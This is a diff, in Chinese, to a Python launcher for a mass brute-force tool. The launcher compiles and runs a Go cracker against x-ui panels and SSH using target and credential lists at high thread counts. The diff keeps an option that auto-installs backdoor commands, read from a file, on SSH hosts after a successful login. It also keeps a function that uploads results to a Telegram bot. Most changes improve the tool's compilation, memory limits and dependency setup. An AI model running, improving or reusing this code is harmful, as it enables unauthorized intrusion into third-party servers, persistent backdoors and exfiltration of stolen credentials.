         return
     }
     fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
@@ -1986,7 +2078,7 @@ if __name__ == "__main__":
 
 """
 
-# =========================== 主脚本部分 (已修复) ===========================
+# =========================== 主脚本部分 (已修复并优化) ===========================
 
 def input_with_default(prompt, default):
     user_input = input(f"{prompt}（默认 {default}）：").strip()
@@ -2095,11 +2187,49 @@ def split_file(input_file, lines_per_file):
         with open(os.path.join(TEMP_PART_DIR, f"part_{idx}.txt"), 'w', encoding='utf-8') as fout:
             fout.writelines(lines[start:start + lines_per_file])
 
+def compile_go_program():
+    executable_name = "xui_executable"
+    if sys.platform == "win32":
+        executable_name += ".exe"
 
-def run_xui_for_parts(sleep_seconds):
+    print("--- 正在编译Go程序... ---")
+    try:
+        result = subprocess.run(
+            ['go', 'build', '-o', executable_name, 'xui.go'],
+            capture_output=True,
+            text=True,
+            check=True,
+            encoding='utf-8'
+        )
+        if result.stderr:
+            print("--- Go编译器警告 ---")
+            print(result.stderr)
+        print(f"--- Go程序编译成功: {executable_name} ---")
+        return executable_name
+    except subprocess.CalledProcessError as e:
+        print("--- Go 程序编译失败 ---")
+        print(f"返回码: {e.returncode}")
+        print("--- 标准输出 ---")
+        print(e.stdout)
+        print("--- 错误输出 ---")
+        print(e.stderr)
+        print("--------------------------")
+        print("编译失败，请检查Go环境和代码。")
+        sys.exit(1)
+
+def run_xui_for_parts(sleep_seconds, executable_name):
     part_files = sorted([f for f in os.listdir(TEMP_PART_DIR) if f.startswith('part_') and f.endswith('.txt')])
     total_parts = len(part_files)
     start_time = time.time()
+
+    total_memory = psutil.virtual_memory().total
+    # --- 修改：使用更保守的80%内存限制 ---
+    mem_limit = int(total_memory * 0.8 / 1024 / 1024)
+    print(f"检测到总内存: {total_memory / 1024 / 1024:.2f} MiB。将设置Go内存限制为: {mem_limit}MiB (总内存的80%)")
+    
+    run_env = os.environ.copy()
+    run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
+
 
     for idx, part in enumerate(part_files, 1):
         elapsed = time.time() - start_time
@@ -2114,31 +2244,34 @@ def run_xui_for_parts(sleep_seconds):
         shutil.copy(os.path.join(TEMP_PART_DIR, part), 'results.txt')
 
         try:
-            print(f"--- 正在运行 Go 程序进行爆破: {part} ---")
+            print(f"--- 正在运行已编译的程序进行爆破: {part} ---")
+            if sys.platform != "win32":
+                os.chmod(executable_name, 0o755)
+            
             result = subprocess.run(
-                ['go', 'run', 'xui.go'],
+                ['./' + executable_name],
                 capture_output=True,
                 text=True,
                 check=True,
-                encoding='utf-8'
+                encoding='utf-8',
+                env=run_env
             )
             if result.stdout:
-                print("--- Go 程序输出 ---")
-                # Filter out progress lines to avoid cluttering the log
+                print("--- 程序输出 ---")
                 for line in result.stdout.splitlines():
                     if not line.startswith('\\r'):
                         print(line)
                 print("--------------------")
 
         except subprocess.CalledProcessError as e:
-            print(f"--- Go 程序执行失败: {part} ---")
+            print(f"--- 程序执行失败: {part} ---")
             print(f"返回码: {e.returncode}")
             print("--- 标准输出 ---")
             print(e.stdout)
             print("--- 错误输出 ---")
             print(e.stderr)
             print("--------------------------")
-            print("go运行失败，请检查环境并查看上面的错误输出。")
+            print("程序运行失败，请查看上面的错误输出。")
             sys.exit(1)
 
 
@@ -2194,7 +2327,7 @@ def clean_temp_files():
     shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
     shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)
 
-    for f in ['results.txt', 'xui.go', 'ipcx.py', 'go.mod', 'go.sum']: 
+    for f in ['results.txt', 'xui.go', 'ipcx.py', 'go.mod', 'go.sum', 'xui_executable', 'xui_executable.exe']: 
         if os.path.exists(f):
             try:
                 os.remove(f)
@@ -2228,38 +2361,6 @@ def choose_template_mode():
         else:
             print("输入无效，请重新输入。")
 
-TEMPLATE_MODE = choose_template_mode()
-
-TEMP_PART_DIR = "temp_parts"
-TEMP_XUI_DIR = "xui_outputs"
-TEMP_HMSUCCESS_DIR = "temp_hmsuccess"
-TEMP_HMFAIL_DIR = "temp_hmfail"
-
-os.makedirs(TEMP_PART_DIR, exist_ok=True)
-os.makedirs(TEMP_XUI_DIR, exist_ok=True)
-os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True)
-os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)
-
-INSTALL_BACKDOOR = False
-CUSTOM_BACKDOOR_CMDS = []
-
-if TEMPLATE_MODE == 6:
-    choice = input("是否在SSH爆破成功后自动安装后门，后门命令需存放在（后门命令.txt）？(y/N)：").strip().lower()
-    if choice == 'y':
-        INSTALL_BACKDOOR = True
-        if not os.path.exists("后门命令.txt"):
-            print("❌ 你选择了安装后门，但未找到 后门命令.txt，已中止爆破。")
-            sys.exit(1)
-        with open("后门命令.txt", encoding='utf-8') as f:
-            CUSTOM_BACKDOOR_CMDS = [line.strip().replace('"', '\\"') for line in f if line.strip()]
-
-enable_backdoor_go = "true" if INSTALL_BACKDOOR else "false"
-
-if CUSTOM_BACKDOOR_CMDS:
-    cmds_go = '[]string{' + ', '.join([f'"{cmd}"' for cmd in CUSTOM_BACKDOOR_CMDS]) + '}'
-else:
-    cmds_go = '[]string{}'
-
 def check_environment():
     import importlib.util
     import subprocess
@@ -2271,19 +2372,22 @@ def check_environment():
     
     if platform.system().lower() == "windows":
         print(">>> 检测到 Windows 系统，跳过环境检测和依赖安装...\\n")
+        try:
+            import psutil, requests, openpyxl
+        except ImportError:
+            print("⚠️ 检测到模块缺失，请在Windows上手动安装: pip install psutil requests openpyxl")
         return
 
-    # Network Pre-flight Check
     print(">>> 正在执行网络预检...")
     try:
         import socket
         socket.create_connection(("www.google.com", 80), timeout=5)
         print("✅ 网络预检成功：可以访问外部网络。")
-    except OSError:
-        print("❌ 网络预检失败：无法连接到外部网络。请检查VPS防火墙、安全组或路由配置。")
+    except OSError as e:
+        print(f"❌ 网络预检失败: {e}")
+        print("这通常是DNS解析问题或网络防火墙导致。请检查您的网络设置，特别是 /etc/resolv.conf 文件。")
         sys.exit(1)
     
-    # Set GOCACHE to prevent "GOCACHE is not defined" error in restricted environments
     go_cache_dir = "/tmp/gocache"
     os.makedirs(go_cache_dir, exist_ok=True)
     os.environ["GOCACHE"] = go_cache_dir
@@ -2312,66 +2416,36 @@ def check_environment():
         except subprocess.CalledProcessError as e:
             if check:
                 raise e
-
-    def apply_china_apt_source():
-        if not os.path.exists("/etc/apt/sources.list"):
-            return
-        with open("/etc/apt/sources.list", "r") as f:
-            content = f.read()
-        if "mirrors.aliyun.com" in content:
-            print(">>> 已使用国内 apt 源，跳过源替换")
-            return
-        print(">>> 正在切换为阿里云 apt 源...")
-        try:
-            shutil.copy("/etc/apt/sources.list", "/etc/apt/sources.list.bak")
-            with open("/etc/apt/sources.list", "w") as f:
-                f.write("""deb http://mirrors.aliyun.com/debian stable main contrib non-free
-deb http://mirrors.aliyun.com/debian stable-updates main contrib non-free
-deb http://mirrors.aliyun.com/debian-security stable-security main contrib non-free
-""")
-            run_cmd(["apt", "update", "-y"])
-            print("✅ 已成功切换为阿里 apt 源")
-        except Exception as e:
-            print(f"❌ 切换 apt 源失败: {e}")
-
-    if IN_CHINA:
-        apply_china_apt_source()
+        except FileNotFoundError:
+            print(f"❌ 命令未找到: {cmd[0]}。请确保该命令在您的系统PATH中。")
+            raise
 
     APT_UPDATED = False
-
-    def ensure_cmd_exists(cmd, install_cmd):
+    def ensure_apt_packages(packages):
         nonlocal APT_UPDATED
-        if shutil.which(cmd) is None:
-            print(f"⚠️ {cmd} 未安装，准备通过 apt 安装...")
-            try:
-                if not APT_UPDATED:
-                    run_cmd(["apt", "update", "-y"])
-                    APT_UPDATED = True
-                run_cmd(install_cmd)
-                print(f"✅ {cmd} 安装成功")
-            except:
-                print(f"❌ 安装 {cmd} 失败，请手动安装后重试！")
-                sys.exit(1)
-        else:
-            print(f"✅ {cmd} 已存在，跳过安装")
+        print(f">>> 正在检查并安装系统依赖: {', '.join(packages)}")
+        try:
+            if not APT_UPDATED:
+                print("    - 正在更新apt包列表...")
+                run_cmd(["apt-get", "update", "-y"])
+                APT_UPDATED = True
+            print(f"    - 正在安装 {', '.join(packages)}...")
+            install_cmd = ["apt-get", "install", "-y"] + packages
+            run_cmd(install_cmd)
+            print(f"✅ 系统依赖安装/验证完成。")
+        except Exception as e:
+            print(f"❌ 安装系统依赖包失败: {e}")
+            print("请尝试手动运行以下命令:")
+            print(f"sudo apt-get update && sudo apt-get install -y {' '.join(packages)}")
+            sys.exit(1)
 
-    def ensure_pip():
-        ensure_cmd_exists("pip3", ["apt", "install", "-y", "python3-pip"])
-
-    def ensure_module(module_name):
-        if importlib.util.find_spec(module_name) is None:
-            print(f"⚠️ 模块 {module_name} 未安装，准备安装...")
-            cmd = ["pip3", "install", module_name]
-            if IN_CHINA:
-                cmd += ["-i", "https://pypi.tuna.tsinghua.edu.cn/simple"]
-            try:
-                subprocess.run(cmd, check=True)
-                print(f"✅ 模块 {module_name} 安装成功")
-            except:
-                print(f"❌ 安装模块 {module_name} 失败，请手动安装！")
-                sys.exit(1)
-        else:
-            print(f"✅ 模块 {module_name} 已安装")
+    python_apt_packages = [
+        "python3-pip",
+        "python3-requests",
+        "python3-openpyxl",
+        "python3-psutil"
+    ]
+    ensure_apt_packages(python_apt_packages)
 
     def get_go_version():
         go_exec = shutil.which("go")
@@ -2381,7 +2455,7 @@ deb http://mirrors.aliyun.com/debian-security stable-security main contrib non-f
                 return None
         try:
             out = subprocess.check_output([go_exec, "version"], stderr=subprocess.DEVNULL).decode()
-            m = re.search(r"go(\\d+)\\.(\\d+)", out)
+            m = re.search(r"go(\d+)\.(\d+)", out)
             return (int(m.group(1)), int(m.group(2))) if m else None
         except:
             return None
@@ -2395,7 +2469,7 @@ deb http://mirrors.aliyun.com/debian-security stable-security main contrib non-f
             return
 
         print("⚠️ Go 未安装或版本过低，准备安装 Go 1.22.1 ...")
-        ensure_cmd_exists("curl", ["apt", "install", "-y", "curl"])
+        ensure_apt_packages(["curl"])
 
         url = "https://studygolang.com/dl/golang/go1.22.1.linux-amd64.tar.gz" if IN_CHINA \
             else "https://go.dev/dl/go1.22.1.linux-amd64.tar.gz"
@@ -2440,10 +2514,6 @@ deb http://mirrors.aliyun.com/debian-security stable-security main contrib non-f
             print(e.stderr)
             sys.exit(1)
 
-    ensure_cmd_exists("curl", ["apt", "install", "-y", "curl"])
-    ensure_pip()
-    ensure_module("requests")
-    ensure_module("openpyxl")
     ensure_go()
 
     if TEMPLATE_MODE == 6:
@@ -2500,9 +2570,40 @@ if __name__ == "__main__":
         start = time.time()
         interrupted = False
         final_result_file = None
+        
+        # --- 修复：将临时目录变量定义在try块外部 ---
+        TEMP_PART_DIR = "temp_parts"
+        TEMP_XUI_DIR = "xui_outputs"
+        TEMP_HMSUCCESS_DIR = "temp_hmsuccess"
+        TEMP_HMFAIL_DIR = "temp_hmfail"
 
         try:
                 check_environment()
+                import psutil
+                from openpyxl import Workbook, load_workbook
+                from openpyxl.utils import get_column_letter
+                import requests
+
+                TEMPLATE_MODE = choose_template_mode()
+
+                os.makedirs(TEMP_PART_DIR, exist_ok=True)
+                os.makedirs(TEMP_XUI_DIR, exist_ok=True)
+                os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True)
+                os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)
+
+                INSTALL_BACKDOOR = False
+                CUSTOM_BACKDOOR_CMDS = []
+
+                if TEMPLATE_MODE == 6:
+                    choice = input("是否在SSH爆破成功后自动安装后门，后门命令需存放在（后门命令.txt）？(y/N)：").strip().lower()
+                    if choice == 'y':
+                        INSTALL_BACKDOOR = True
+                        if not os.path.exists("后门命令.txt"):
+                            print("❌ 你选择了安装后门，但未找到 后门命令.txt，已中止爆破。")
+                            sys.exit(1)
+                        with open("后门命令.txt", encoding='utf-8') as f:
+                            CUSTOM_BACKDOOR_CMDS = [line.strip().replace('"', '\\"') for line in f if line.strip()]
+
                 print("=== 爆破一键启动 ===")
                 input_file = input_filename_with_default("请输入源文件名", "1.txt")
                 if not os.path.exists(input_file):
@@ -2512,6 +2613,17 @@ if __name__ == "__main__":
                 lines_per_file = input_with_default("每个小文件行数", 5000)
                 sleep_seconds = input_with_default("爆破完休息秒数", 2)
                 semaphore_size = input_with_default("爆破线程数", 250)
+                
+                if semaphore_size > 5000:
+                    print("\\n" + "="*50)
+                    print("⚠️  警告: 您设置的线程数非常高 (>5000)。 ⚠️")
+                    print("这可能会消耗大量内存并导致脚本被系统终止。")
+                    print("建议将线程数设置在 200-2000 范围内。")
+                    print("="*50 + "\\n")
+                    confirm = input("是否确定要继续？(y/N): ").strip().lower()
+                    if confirm != 'y':
+                        print("操作已取消。")
+                        sys.exit(0)
 
                 usernames, passwords = load_credentials()
                 
@@ -2529,10 +2641,10 @@ if __name__ == "__main__":
                 gen_func, args = template_map[TEMPLATE_MODE]
                 gen_func(*args)
 
-
+                executable = compile_go_program()
                 generate_ipcx_py()
                 split_file(input_file, lines_per_file)
-                run_xui_for_parts(sleep_seconds)
+                run_xui_for_parts(sleep_seconds, executable)
                 
                 merge_xui_files()
                 merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR)
@@ -2540,8 +2652,6 @@ if __name__ == "__main__":
 
                 run_ipcx()
 
-                import os
-                import shutil
                 from datetime import datetime, timedelta, timezone
 
                 beijing_time = datetime.now(timezone.utc).replace(tzinfo=timezone.utc) + timedelta(hours=8)
@@ -2563,6 +2673,9 @@ if __name__ == "__main__":
         except KeyboardInterrupt:
                 print("\\n>>> 用户中断操作（Ctrl+C），准备清理临时文件...")
                 interrupted = True
+        except SystemExit as e:
+                # 捕获由 check_environment 触发的退出
+                print(f"\\n脚本因环境问题中止。")
         finally:
                 clean_temp_files()
                 end = time.time()
@@ -2574,9 +2687,6 @@ if __name__ == "__main__":
                         print(f"\\n=== 全部完成！总用时 {cost // 60} 分 {cost % 60} 秒 ===")
 
                 def send_to_telegram(file_path, bot_token, chat_id):
-                        import requests
-                        import os
-
                         if not os.path.exists(file_path):
                                 print(f"⚠️ Telegram 上传失败：文件 {file_path} 不存在")
                                 return
